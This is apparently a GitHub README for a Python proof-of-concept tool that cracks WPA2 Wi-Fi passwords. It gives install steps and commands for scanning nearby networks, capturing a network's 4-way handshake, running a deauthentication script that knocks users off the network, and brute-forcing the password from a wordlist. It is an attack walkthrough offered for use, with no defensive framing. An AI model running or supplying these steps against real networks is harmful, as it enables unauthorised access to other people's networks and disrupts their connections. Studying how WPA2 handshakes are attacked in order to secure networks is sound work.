# WPA2-Crack
This a POC to show how a WPA-2 network can be cracked by computing the message integrity check in python.

## Requirements
* Python >= 3.6
* pbkdf2 == 1.3
* scapy >= 2.4.3

## Installation
  ```bash
  git clone https://github.com/Njord0/WPA2-Crack.git
  cd WPA2-Crack
  pip3 install -r requirements.txt
  ```
  
## Usage
  The interface needs to be in monitor mode. (No check is done yet, it is just not going to work)
  The first step is to discover wifi network around us, for this we can use the `scan_wifi.py` script:
  ```sh
  sudo python3 scan_wifi.py -i wlan0mon
  ```

  For every wifi networks around you, you will be able to see the channel, BSSID and SSID
  We are now ready to capture the 4-way handshake for a choosen network + a beacon frame from this network.
  ```sh
  python3 capture_handshake.py -i wlan0mon -b xx:xx:xx:xx:xx:xx -c 1 -o handshake.pcap
  ```
  This script is now waiting for a device to connect to the network in order to capture the 4-Way handhsake, we can use the deauth.py script to disconnect user from the network:

  ```sh
  python3 deauth.py -i wlan0mon -b xx:xx:xx:xx:xx:xx
  ```
  
  Once we captured the handshake we are ready to start cracking the password
  ```sh
  python3 crack_password -w wordlist -p handshake.pcap
  ```
  If the password is in the wordlist, it will be found and displayed to the screen.

  Here is a short video: https://www.youtube.com/watch?v=U7SkzveOCqs
  
  ### Changelogs
  ```
  v2.0.0
  ------
  * Added a beacon frame in the capture, to avoid error when user had to enter the SSID in crack_password.py script
  * Code refactoring, espacially tab changed into spaces !
  * Renamed files name
  * Added option to enter output filename in capture_handshake.py script
  * Deleted SSID option in crack_password.py script
  ```

